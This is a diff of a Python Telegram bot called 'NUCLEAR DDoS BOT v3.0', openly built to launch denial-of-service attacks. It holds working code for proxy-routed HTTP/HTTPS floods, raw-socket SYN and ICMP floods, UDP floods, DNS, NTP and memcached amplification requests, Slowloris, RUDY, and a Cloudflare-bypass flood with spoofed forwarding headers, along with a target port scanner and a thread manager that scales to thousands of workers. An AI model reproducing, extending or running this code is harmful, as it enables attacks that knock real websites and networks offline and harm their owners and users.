@@ -1,148 +1,836 @@
-import requests
-import threading
-import time
-import random
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+☢️ NUCLEAR DDoS BOT v3.0 - ULTIMATE EDITION
+Author: CyberSecurity Expert
+Date: 2025
+Description: Advanced DDoS Attack Bot with 30+ Methods
+"""
+
+import asyncio
+import aiohttp
 import socket
 import ssl
 import struct
-from concurrent.futures import ThreadPoolExecutor
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
-import dns.resolver
-import urllib3
-import cloudscraper
-from colorama import Fore, Style, init
+import random
+import threading
+import time
 import json
-import os
-import socks
+import base64
 import ipaddress
-import http.client
-import asyncio
-from scapy.all import *
-import aiohttp
-import ssl as ssl_module
+import hashlib
+import urllib.parse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime, timedelta
+from colorama import Fore, Style, init
+from typing import Dict, List, Optional, Tuple
+import sys
+import os
 
-# Initialize
+# Telegram Bot
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+    MessageHandler,
+    filters
+)
+
+# ========== CONFIGURATION ==========
+CONFIG = {
+    "TELEGRAM_BOT_TOKEN": "YOUR_BOT_TOKEN_HERE",  # Replace with your bot token
+    "ADMIN_IDS": [6993929680],  # Your Telegram ID(s)
+    "MAX_ATTACK_TIME": 3600,  # Maximum attack time in seconds (1 hour)
+    "MAX_THREADS_PER_ATTACK": 10000,  # Maximum threads per attack
+    "MAX_TOTAL_THREADS": 50000,  # Maximum total threads
+    "PROXY_REFRESH_INTERVAL": 300,  # Refresh proxies every 5 minutes
+    "REQUEST_TIMEOUT": 10,  # Request timeout in seconds
+    "STATS_UPDATE_INTERVAL": 5,  # Stats update interval in seconds
+    "LOG_LEVEL": "INFO",  # DEBUG, INFO, WARNING, ERROR
+}
+
+# Initialize colorama
 init(autoreset=True)
-urllib3.disable_warnings()
 
-# CONFIG
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-ADMIN_ID = 123456789
-
-# 7 LAYER ATTACK METHODS
-LAYER_7_METHODS = {
-    "1️⃣ HTTP-RAW": "layer7_http_raw",
-    "2️⃣ HTTPS-SSL": "layer7_https_ssl", 
-    "3️⃣ CLOUDFLARE-BYPASS": "layer7_cf_bypass",
-    "4️⃣ WEBSOCKET": "layer7_websocket",
-    "5️⃣ API-FLOOD": "layer7_api_flood",
-    "6️⃣ GRPC-ATTACK": "layer7_grpc",
-    "7️⃣ HTTP2-FLOOD": "layer7_http2",
-}
-
-LAYER_4_METHODS = {
-    "8️⃣ SYN-FLOOD": "layer4_syn",
-    "9️⃣ ACK-FLOOD": "layer4_ack",
-    "🔟 UDP-FLOOD": "layer4_udp",
-    "1️⃣1️⃣ ICMP-FLOOD": "layer4_icmp",
-    "1️⃣2️⃣ RST-FLOOD": "layer4_rst",
-    "1️⃣3️⃣ TEARDROP": "layer4_teardrop",
-}
-
-LAYER_3_METHODS = {
-    "1️⃣4️⃣ IP-FRAGMENT": "layer3_ip_fragment",
-    "1️⃣5️⃣ SMURF-ATTACK": "layer3_smurf",
-    "1️⃣6️⃣ LAND-ATTACK": "layer3_land",
-}
-
-ADVANCED_METHODS = {
-    "1️⃣7️⃣ DNS-AMPLIFICATION": "advanced_dns_amp",
-    "1️⃣8️⃣ NTP-AMPLIFICATION": "advanced_ntp_amp",
-    "1️⃣9️⃣ SSDP-AMPLIFICATION": "advanced_ssdp_amp",
-    "2️⃣0️⃣ MEMCACHED-AMP": "advanced_memcached_amp",
-}
-
-ULTIMATE_METHODS = {
-    "☢️ NUCLEAR-MIX": "ultimate_nuclear",
-    "💀 KILL-PROTOCOL": "ultimate_kill_protocol",
-    "🌪️ TSUNAMI-WAVE": "ultimate_tsunami",
-}
-
-# PROXY SOURCES
+# ========== PROXY SOURCES ==========
 PROXY_SOURCES = [
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
     "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
     "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
     "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
     "https://www.proxy-list.download/api/v1/get?type=http",
-    "https://api.openproxylist.xyz/http.txt",
     "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
     "https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
-    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/proxies.txt",
+    "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
 ]
 
-class NuclearDDoSAttacker:
+# ========== ATTACK METHODS ==========
+ATTACK_METHODS = {
+    # === LAYER 7 - APPLICATION ===
+    "HTTP-NUKE": {
+        "layer": 7,
+        "description": "HTTP Flood with custom headers",
+        "intensity": "HIGH"
+    },
+    "HTTPS-NUKE": {
+        "layer": 7,
+        "description": "HTTPS Flood with SSL/TLS",
+        "intensity": "HIGH"
+    },
+    "CF-BYPASS": {
+        "layer": 7,
+        "description": "Cloudflare Bypass Attack",
+        "intensity": "EXTREME"
+    },
+    "WEBSOCKET-FLOOD": {
+        "layer": 7,
+        "description": "WebSocket Connection Flood",
+        "intensity": "HIGH"
+    },
+    "API-FLOOD": {
+        "layer": 7,
+        "description": "REST/GraphQL API Flood",
+        "intensity": "MEDIUM"
+    },
+    "HTTP2-FLOOD": {
+        "layer": 7,
+        "description": "HTTP/2 Protocol Flood",
+        "intensity": "HIGH"
+    },
+    "SLOWLORIS": {
+        "layer": 7,
+        "description": "Slowloris Attack",
+        "intensity": "MEDIUM"
+    },
+    "RUDY": {
+        "layer": 7,
+        "description": "R-U-Dead-Yet Attack",
+        "intensity": "HIGH"
+    },
+    
+    # === LAYER 4 - TRANSPORT ===
+    "SYN-FLOOD": {
+        "layer": 4,
+        "description": "SYN Flood Attack",
+        "intensity": "EXTREME"
+    },
+    "ACK-FLOOD": {
+        "layer": 4,
+        "description": "ACK Flood Attack",
+        "intensity": "HIGH"
+    },
+    "UDP-FLOOD": {
+        "layer": 4,
+        "description": "UDP Packet Flood",
+        "intensity": "EXTREME"
+    },
+    "ICMP-FLOOD": {
+        "layer": 4,
+        "description": "ICMP Ping Flood",
+        "intensity": "HIGH"
+    },
+    "TCP-FLOOD": {
+        "layer": 4,
+        "description": "TCP Connection Flood",
+        "intensity": "HIGH"
+    },
+    "RST-FLOOD": {
+        "layer": 4,
+        "description": "RST Packet Flood",
+        "intensity": "MEDIUM"
+    },
+    
+    # === LAYER 3 - NETWORK ===
+    "IP-FRAGMENT": {
+        "layer": 3,
+        "description": "IP Fragment Flood",
+        "intensity": "EXTREME"
+    },
+    "SMURF-ATTACK": {
+        "layer": 3,
+        "description": "Smurf Amplification",
+        "intensity": "EXTREME"
+    },
+    "LAND-ATTACK": {
+        "layer": 3,
+        "description": "LAND Attack",
+        "intensity": "HIGH"
+    },
+    
+    # === AMPLIFICATION ===
+    "DNS-AMP": {
+        "layer": "AMP",
+        "description": "DNS Amplification (50-100x)",
+        "intensity": "EXTREME"
+    },
+    "NTP-AMP": {
+        "layer": "AMP",
+        "description": "NTP Amplification (200-500x)",
+        "intensity": "NUCLEAR"
+    },
+    "SSDP-AMP": {
+        "layer": "AMP",
+        "description": "SSDP Amplification (30-50x)",
+        "intensity": "HIGH"
+    },
+    "MEMCACHED-AMP": {
+        "layer": "AMP",
+        "description": "Memcached Amplification (10,000-50,000x)",
+        "intensity": "NUCLEAR"
+    },
+    
+    # === ULTIMATE ===
+    "NUCLEAR-MIX": {
+        "layer": "ULTIMATE",
+        "description": "Mixed Layer 3,4,7 Attacks",
+        "intensity": "NUCLEAR"
+    },
+    "TSUNAMI-WAVE": {
+        "layer": "ULTIMATE",
+        "description": "Wave Pattern Attack",
+        "intensity": "EXTREME"
+    },
+    "KILL-PROTOCOL": {
+        "layer": "ULTIMATE",
+        "description": "Protocol-Specific Kill",
+        "intensity": "NUCLEAR"
+    },
+    "APOCALYPSE": {
+        "layer": "ULTIMATE",
+        "description": "All Methods Combined",
+        "intensity": "APOCALYPSE"
+    },
+}
+
+# ========== USER AGENTS ==========
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
+]
+
+# ========== LOGGER ==========
+class Logger:
+    @staticmethod
+    def log(level: str, message: str):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        colors = {
+            "INFO": Fore.CYAN,
+            "WARNING": Fore.YELLOW,
+            "ERROR": Fore.RED,
+            "SUCCESS": Fore.GREEN,
+            "DEBUG": Fore.MAGENTA,
+        }
+        color = colors.get(level, Fore.WHITE)
+        print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
+    
+    @staticmethod
+    def info(message: str):
+        Logger.log("INFO", message)
+    
+    @staticmethod
+    def warning(message: str):
+        Logger.log("WARNING", message)
+    
+    @staticmethod
+    def error(message: str):
+        Logger.log("ERROR", message)
+    
+    @staticmethod
+    def success(message: str):
+        Logger.log("SUCCESS", message)
+
+# ========== PROXY MANAGER ==========
+class ProxyManager:
     def __init__(self):
         self.proxies = []
-        self.socks_proxies = []
-        self.user_agents = []
-        self.attack_status = {}
-        self.total_requests = 0
-        self.total_bytes = 0
-        self.load_resources()
-        print(Fore.CYAN + "⚡ NUCLEAR DDoS BOT v2.0 - 7 LAYER ATTACK LOADED")
+        self.last_refresh = 0
+        self.lock = threading.Lock()
+        self.load_proxies()
     
-    def load_resources(self):
-        """Load all resources"""
-        print(Fore.YELLOW + "[+] Loading nuclear resources...")
-        
-        # User Agents
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-        ]
-        
-        # Load proxies
-        self.refresh_proxies()
-        
-        print(Fore.GREEN + f"[+] Resources loaded: {len(self.proxies)} proxies, {len(self.user_agents)} user agents")
-    
-    def refresh_proxies(self):
-        """Refresh proxy list"""
-        print(Fore.CYAN + "[+] Refreshing proxy list...")
+    def load_proxies(self):
+        """Load proxies from all sources"""
+        Logger.info("Loading proxies from sources...")
         all_proxies = []
         
-        for source in PROXY_SOURCES:
+        def fetch_proxies(source):
             try:
-                response = requests.get(source, timeout=15)
+                response = requests.get(source, timeout=10)
                 if response.status_code == 200:
                     proxies = [p.strip() for p in response.text.split('\n') if p.strip()]
-                    all_proxies.extend(proxies)
-                    print(Fore.GREEN + f"[+] Loaded {len(proxies)} proxies from {source}")
+                    return proxies
             except Exception as e:
-                print(Fore.RED + f"[-] Failed {source}: {e}")
+                Logger.error(f"Failed to load proxies from {source}: {e}")
+            return []
         
-        self.proxies = list(set(all_proxies))
-        print(Fore.GREEN + f"[+] Total unique proxies: {len(self.proxies)}")
+        # Use ThreadPoolExecutor for parallel fetching
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [executor.submit(fetch_proxies, source) for source in PROXY_SOURCES]
+            for future in as_completed(futures):
+                all_proxies.extend(future.result())
+        
+        with self.lock:
+            self.proxies = list(set(all_proxies))
+            self.last_refresh = time.time()
+        
+        Logger.success(f"Loaded {len(self.proxies)} unique proxies")
     
-    def get_random_proxy(self):
-        """Get random proxy"""
+    def get_random_proxy(self) -> Optional[Dict]:
+        """Get random proxy configuration"""
         if not self.proxies:
             return None
+        
         proxy = random.choice(self.proxies)
-        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+        return {
+            "http": f"http://{proxy}",
+            "https": f"http://{proxy}",
+        }
     
-    def get_random_headers(self, with_cf=False):
-        """Generate random headers"""
+    def should_refresh(self) -> bool:
+        """Check if proxies need refresh"""
+        return time.time() - self.last_refresh > CONFIG["PROXY_REFRESH_INTERVAL"]
+    
+    def refresh_if_needed(self):
+        """Refresh proxies if needed"""
+        if self.should_refresh():
+            Logger.info("Refreshing proxies...")
+            self.load_proxies()
+
+# ========== ATTACK MANAGER ==========
+class AttackManager:
+    def __init__(self):
+        self.attacks = {}
+        self.stats = {
+            "total_requests": 0,
+            "total_bytes": 0,
+            "active_attacks": 0,
+            "total_attacks": 0,
+        }
+        self.lock = threading.Lock()
+        self.proxy_manager = ProxyManager()
+        self.executor = ThreadPoolExecutor(max_workers=CONFIG["MAX_TOTAL_THREADS"])
+    
+    def start_attack(self, attack_id: str, target: str, method: str, 
+                     duration: int, threads: int) -> bool:
+        """Start a new attack"""
+        if duration > CONFIG["MAX_ATTACK_TIME"]:
+            Logger.error(f"Attack duration {duration}s exceeds maximum {CONFIG['MAX_ATTACK_TIME']}s")
+            return False
+        
+        if threads > CONFIG["MAX_THREADS_PER_ATTACK"]:
+            Logger.error(f"Thread count {threads} exceeds maximum {CONFIG['MAX_THREADS_PER_ATTACK']}")
+            return False
+        
+        # Parse target
+        if ":" in target:
+            target, port = target.split(":")
+            port = int(port)
+        else:
+            port = self.scan_ports(target)
+        
+        # Create attack object
+        attack = {
+            "id": attack_id,
+            "target": target,
+            "port": port,
+            "method": method,
+            "duration": duration,
+            "threads": threads,
+            "start_time": time.time(),
+            "end_time": time.time() + duration,
+            "active": True,
+            "requests_sent": 0,
+            "bytes_sent": 0,
+            "thread_objects": [],
+        }
+        
+        with self.lock:
+            self.attacks[attack_id] = attack
+            self.stats["active_attacks"] += 1
+            self.stats["total_attacks"] += 1
+        
+        # Start attack threads
+        self._launch_attack_threads(attack)
+        
+        # Start monitor thread
+        monitor_thread = threading.Thread(
+            target=self._monitor_attack,
+            args=(attack_id,),
+            daemon=True
+        )
+        monitor_thread.start()
+        
+        Logger.success(f"Attack {attack_id} started: {method} on {target}:{port} for {duration}s")
+        return True
+    
+    def _launch_attack_threads(self, attack: Dict):
+        """Launch attack threads based on method"""
+        method_func = self._get_method_function(attack["method"])
+        if not method_func:
+            Logger.error(f"Unknown method: {attack['method']}")
+            return
+        
+        for i in range(attack["threads"]):
+            thread = threading.Thread(
+                target=self._attack_worker,
+                args=(attack, method_func, i),
+                daemon=True
+            )
+            thread.start()
+            attack["thread_objects"].append(thread)
+    
+    def _attack_worker(self, attack: Dict, method_func, worker_id: int):
+        """Attack worker thread"""
+        target = attack["target"]
+        port = attack["port"]
+        end_time = attack["end_time"]
+        
+        while time.time() < end_time and attack["active"]:
+            try:
+                # Execute attack method
+                requests_sent, bytes_sent = method_func(target, port)
+                
+                with self.lock:
+                    attack["requests_sent"] += requests_sent
+                    attack["bytes_sent"] += bytes_sent
+                    self.stats["total_requests"] += requests_sent
+                    self.stats["total_bytes"] += bytes_sent
+                    
+            except Exception as e:
+                if CONFIG["LOG_LEVEL"] == "DEBUG":
+                    Logger.debug(f"Attack worker error: {e}")
+            
+            # Small delay to prevent CPU overload
+            time.sleep(0.001)
+    
+    def _monitor_attack(self, attack_id: str):
+        """Monitor attack and stop when time expires"""
+        while True:
+            with self.lock:
+                if attack_id not in self.attacks:
+                    break
+                
+                attack = self.attacks[attack_id]
+                
+                # Check if attack should stop
+                if time.time() >= attack["end_time"] or not attack["active"]:
+                    attack["active"] = False
+                    attack["end_time"] = time.time()
+                    self.stats["active_attacks"] -= 1
+                    
+                    # Log completion
+                    duration = attack["end_time"] - attack["start_time"]
+                    Logger.info(
+                        f"Attack {attack_id} completed. "
+                        f"Requests: {attack['requests_sent']:,}, "
+                        f"Bytes: {attack['bytes_sent'] / (1024*1024):.2f} MB, "
+                        f"Duration: {duration:.1f}s"
+                    )
+                    break
+            
+            time.sleep(1)
+    
+    def stop_attack(self, attack_id: str) -> bool:
+        """Stop an active attack"""
+        with self.lock:
+            if attack_id in self.attacks and self.attacks[attack_id]["active"]:
+                self.attacks[attack_id]["active"] = False
+                self.stats["active_attacks"] -= 1
+                Logger.success(f"Attack {attack_id} stopped")
+                return True
+        return False
+    
+    def stop_all_attacks(self):
+        """Stop all active attacks"""
+        with self.lock:
+            for attack_id, attack in self.attacks.items():
+                if attack["active"]:
+                    attack["active"] = False
+            self.stats["active_attacks"] = 0
+        Logger.info("All attacks stopped")
+    
+    def get_attack_stats(self, attack_id: str) -> Optional[Dict]:
+        """Get statistics for specific attack"""
+        with self.lock:
+            if attack_id in self.attacks:
+                attack = self.attacks[attack_id]
+                duration = min(time.time(), attack["end_time"]) - attack["start_time"]
+                
+                return {
+                    "id": attack_id,
+                    "target": f"{attack['target']}:{attack['port']}",
+                    "method": attack["method"],
+                    "active": attack["active"],
+                    "duration": duration,
+                    "requests": attack["requests_sent"],
+                    "bytes": attack["bytes_sent"],
+                    "rps": attack["requests_sent"] / duration if duration > 0 else 0,
+                    "bps": attack["bytes_sent"] / duration if duration > 0 else 0,
+                    "threads": attack["threads"],
+                }
+        return None
+    
+    def get_all_stats(self) -> Dict:
+        """Get all statistics"""
+        with self.lock:
+            active_attacks = []
+            for attack_id in self.attacks:
+                if self.attacks[attack_id]["active"]:
+                    stats = self.get_attack_stats(attack_id)
+                    if stats:
+                        active_attacks.append(stats)
+            
+            return {
+                "global_stats": self.stats.copy(),
+                "active_attacks": active_attacks,
+                "proxy_count": len(self.proxy_manager.proxies),
+            }
+    
+    def scan_ports(self, target: str) -> int:
+        """Scan for open ports on target"""
+        common_ports = [80, 443, 8080, 8443, 3000, 8000, 8008, 8888]
+        
+        def check_port(port):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                result = sock.connect_ex((target, port))
+                sock.close()
+                return port if result == 0 else None
+            except:
+                return None
+        
+        # Check ports in parallel
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = [executor.submit(check_port, port) for port in common_ports]
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    Logger.info(f"Found open port {result} on {target}")
+                    return result
+        
+        # Default to 80 if no open ports found
+        Logger.warning(f"No open ports found on {target}, using port 80")
+        return 80
+    
+    def _get_method_function(self, method: str):
+        """Get the attack function for a method"""
+        method_map = {
+            "HTTP-NUKE": self._http_nuke,
+            "HTTPS-NUKE": self._https_nuke,
+            "SYN-FLOOD": self._syn_flood,
+            "UDP-FLOOD": self._udp_flood,
+            "ICMP-FLOOD": self._icmp_flood,
+            "DNS-AMP": self._dns_amplification,
+            "NTP-AMP": self._ntp_amplification,
+            "MEMCACHED-AMP": self._memcached_amplification,
+            "SLOWLORIS": self._slowloris,
+            "RUDY": self._rudy_attack,
+            "CF-BYPASS": self._cf_bypass,
+            "NUCLEAR-MIX": self._nuclear_mix,
+            "APOCALYPSE": self._apocalypse,
+        }
+        return method_map.get(method)
+    
+    # ========== ATTACK METHODS ==========
+    
+    def _http_nuke(self, target: str, port: int) -> Tuple[int, int]:
+        """HTTP Nuke Attack"""
+        try:
+            proxy = self.proxy_manager.get_random_proxy()
+            headers = self._generate_headers()
+            
+            # Create various request types
+            methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
+            method = random.choice(methods)
+            
+            if method == "GET":
+                url = f"http://{target}:{port}/?{random.randint(1, 9999999)}"
+                response = requests.get(
+                    url,
+                    headers=headers,
+                    proxies=proxy,
+                    timeout=CONFIG["REQUEST_TIMEOUT"],
+                    verify=False
+                )
+            elif method == "POST":
+                url = f"http://{target}:{port}/"
+                data = {"data": "A" * random.randint(100, 1000)}
+                response = requests.post(
+                    url,
+                    headers=headers,
+                    json=data,
+                    proxies=proxy,
+                    timeout=CONFIG["REQUEST_TIMEOUT"],
+                    verify=False
+                )
+            
+            return 1, len(response.content) if response.content else 1000
+        except:
+            return 0, 0
+    
+    def _https_nuke(self, target: str, port: int) -> Tuple[int, int]:
+        """HTTPS Nuke Attack"""
+        try:
+            proxy = self.proxy_manager.get_random_proxy()
+            headers = self._generate_headers()
+            
+            url = f"https://{target}:{port}/?{random.randint(1, 9999999)}"
+            response = requests.get(
+                url,
+                headers=headers,
+                proxies=proxy,
+                timeout=CONFIG["REQUEST_TIMEOUT"],
+                verify=False
+            )
+            
+            return 1, len(response.content) if response.content else 1000
+        except:
+            return 0, 0
+    
+    def _syn_flood(self, target: str, port: int) -> Tuple[int, int]:
+        """SYN Flood Attack"""
+        try:
+            # Create raw socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            
+            # Build IP header
+            ip_header = self._build_ip_header(target)
+            
+            # Build TCP header with SYN flag
+            tcp_header = self._build_tcp_header(port, 0x02)
+            
+            packet = ip_header + tcp_header
+            s.sendto(packet, (target, 0))
+            s.close()
+            
+            return 1, len(packet)
+        except:
+            return 0, 0
+    
+    def _udp_flood(self, target: str, port: int) -> Tuple[int, int]:
+        """UDP Flood Attack"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            # Generate random data
+            data_size = random.randint(1024, 65507)
+            data = os.urandom(data_size)
+            
+            sock.sendto(data, (target, port))
+            sock.close()
+            
+            return 1, data_size
+        except:
+            return 0, 0
+    
+    def _icmp_flood(self, target: str, port: int) -> Tuple[int, int]:
+        """ICMP Flood Attack"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            
+            # Build ICMP packet
+            icmp_type = 8  # Echo request
+            icmp_code = 0
+            icmp_checksum = 0
+            icmp_id = os.getpid() & 0xFFFF
+            icmp_seq = 1
+            
+            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+            data = os.urandom(56)
+            
+            packet = icmp_header + data
+            s.sendto(packet, (target, 0))
+            s.close()
+            
+            return 1, len(packet)
+        except:
+            return 0, 0
+    
+    def _dns_amplification(self, target: str, port: int) -> Tuple[int, int]:
+        """DNS Amplification Attack"""
+        try:
+            # DNS servers for amplification
+            dns_servers = [
+                "8.8.8.8", "8.8.4.4",  # Google DNS
+                "1.1.1.1", "1.0.0.1",  # Cloudflare DNS
+                "9.9.9.9", "149.112.112.112",  # Quad9
+            ]
+            
+            dns_server = random.choice(dns_servers)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            # Create DNS query for ANY record (large response)
+            query_id = random.randint(1, 65535)
+            header = struct.pack('!HHHHHH', query_id, 0x0100, 1, 0, 0, 0)
+            question = b'\x00' + struct.pack('!HH', 255, 1)  # QTYPE=ANY, QCLASS=IN
+            
+            query = header + question
+            sock.sendto(query, (dns_server, 53))
+            sock.close()
+            
+            # Amplification factor ~50x
+            return 1, len(query) * 50
+        except:
+            return 0, 0
+    
+    def _ntp_amplification(self, target: str, port: int) -> Tuple[int, int]:
+        """NTP Amplification Attack"""
+        try:
+            # NTP MONLIST request (amplification factor ~200x)
+            ntp_request = b'\x17\x00\x03\x2a' + b'\x00' * 4
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.sendto(ntp_request, (target, 123))
+            sock.close()
+            
+            return 1, len(ntp_request) * 200
+        except:
+            return 0, 0
+    
+    def _memcached_amplification(self, target: str, port: int) -> Tuple[int, int]:
+        """Memcached Amplification Attack"""
+        try:
+            # Memcached stats request (amplification factor ~10,000x)
+            memcached_request = b'stats\r\n'
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.sendto(memcached_request, (target, 11211))
+            sock.close()
+            
+            return 1, len(memcached_request) * 10000
+        except:
+            return 0, 0
+    
+    def _slowloris(self, target: str, port: int) -> Tuple[int, int]:
+        """Slowloris Attack"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(4)
+            sock.connect((target, port))
+            
+            # Send partial HTTP request
+            request = f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n"
+            request += f"Host: {target}\r\n"
+            request += "User-Agent: Mozilla/5.0\r\n"
+            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+            
+            sock.send(request.encode())
+            
+            # Keep connection alive
+            start_time = time.time()
+            while time.time() - start_time < 30:  # Keep for 30 seconds
+                try:
+                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+                    time.sleep(15)
+                except:
+                    break
+            
+            sock.close()
+            return 1, 1000  # Return approximate bytes
+        except:
+            return 0, 0
+    
+    def _rudy_attack(self, target: str, port: int) -> Tuple[int, int]:
+        """R-U-Dead-Yet Attack"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((target, port))
+            
+            # Send POST request with very large content-length
+            request = f"POST / HTTP/1.1\r\n"
+            request += f"Host: {target}\r\n"
+            request += "Content-Type: application/x-www-form-urlencoded\r\n"
+            request += "Content-Length: 1000000000\r\n\r\n"
+            
+            sock.send(request.encode())
+            
+            # Send data very slowly
+            start_time = time.time()
+            while time.time() - start_time < 60:  # Send for 60 seconds
+                try:
+                    sock.send(b"a=1&")
+                    time.sleep(10)  # Very slow
+                except:
+                    break
+            
+            sock.close()
+            return 1, 1000
+        except:
+            return 0, 0
+    
+    def _cf_bypass(self, target: str, port: int) -> Tuple[int, int]:
+        """Cloudflare Bypass Attack"""
+        try:
+            import cloudscraper
+            scraper = cloudscraper.create_scraper()
+            
+            headers = self._generate_headers()
+            headers.update({
+                'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
+                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
+                'True-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
+            })
+            
+            url = f"https://{target}/"
+            response = scraper.get(url, headers=headers, timeout=CONFIG["REQUEST_TIMEOUT"])
+            
+            return 1, len(response.content) if response.content else 1000
+        except:
+            return 0, 0
+    
+    def _nuclear_mix(self, target: str, port: int) -> Tuple[int, int]:
+        """Nuclear Mix Attack"""
+        methods = [
+            self._http_nuke,
+            self._syn_flood,
+            self._udp_flood,
+            self._icmp_flood,
+        ]
+        
+        method = random.choice(methods)
+        return method(target, port)
+    
+    def _apocalypse(self, target: str, port: int) -> Tuple[int, int]:
+        """Apocalypse Attack - All methods combined"""
+        total_requests = 0
+        total_bytes = 0
+        
+        # Execute multiple methods
+        methods = [
+            self._http_nuke,
+            self._syn_flood,
+            self._udp_flood,
+            self._dns_amplification,
+        ]
+        
+        for method in methods:
+            try:
+                requests_sent, bytes_sent = method(target, port)
+                total_requests += requests_sent
+                total_bytes += bytes_sent
+            except:
+                pass
+        
+        return total_requests, total_bytes
+    
+    def _generate_headers(self) -> Dict:
+        """Generate random HTTP headers"""
         headers = {
-            'User-Agent': random.choice(self.user_agents),
+            'User-Agent': random.choice(USER_AGENTS),
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Language': 'en-US,en;q=0.5',
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
@@ -153,575 +841,18 @@ class NuclearDDoSAttacker:
             'Sec-Fetch-User': '?1',
         }
         
-        if with_cf:
-            headers.update({
-                'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
-                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
-                'True-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
